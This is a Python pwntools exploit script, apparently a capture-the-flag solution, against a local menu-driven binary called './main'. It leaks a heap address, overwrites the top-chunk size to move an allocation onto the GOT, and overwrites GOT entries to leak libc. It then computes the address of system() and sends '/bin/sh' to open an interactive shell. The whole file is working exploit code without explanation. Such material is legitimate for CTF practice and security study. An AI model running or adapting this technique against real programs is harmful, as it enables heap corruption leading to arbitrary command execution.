from pwn import *


free_got=0x602018
write=0x0000000000400736
putchar=0x0000000000400716
puts=0x0000000000400726
printf=0x0000000000400756
malloc=0x0000000000400786
fflush=0x0000000000400796
setvbuf=0x00000000004007a6
scanf=0x00000000004007b6
read=0x0000000000400766
getchar=0x0000000000400776
p=process("./main")
p.recvuntil(">")
p.sendline("1")
p.recvuntil("customer's name?")
p.sendline("4")
p.recvuntil("name:")
p.sendline("abc")
addr=int(p.recvline().split(':')[1][3:-1],16)
print "addr :",hex(addr)
print "offset to free :",(addr-free_got)
p.recvuntil(">")
p.sendline("2")
p.recvuntil("customer ?")
p.sendline("0")
p.recvuntil("length:")
p.sendline("50")
p.sendline("A"*24+p64(0xffffffffffffffff))
p.sendline("")
p.sendline("1")
p.sendline("-"+str(addr-free_got+40))

p.sendline("1")
p.sendline("500")
payload=""
payload+=p64(putchar)
payload+=p64(puts)
payload+=p64(write)
payload+=p64(puts)
p.send(payload)
p.recv()

p.sendline("2")
p.recv()
p.sendline("2")
leak=u64(p.recvline()[:6].ljust(8,"\x00"))
base=leak-0x082810
system=base+0x04f440
print "leak :",hex(leak)
print "base :",hex(base)
print "system :",hex(system)

print p.recv()
p.sendline("80")
payload=""
payload+=p64(putchar)
payload+=p64(puts)
payload+=p64(write)
payload+=p64(system)
payload+=p64(printf)
payload+=p64(read)
payload+=p64(getchar)
payload+=p64(malloc)
payload+=p64(fflush)
payload+=p64(setvbuf)
payload+=p64(scanf)

p.sendline(payload)
p.sendline("1")
p.sendline("8")
p.sendline("/bin/sh")
p.sendline("2")
p.sendline("3")
#gdb.attach(p.pid)
p.interactive()






























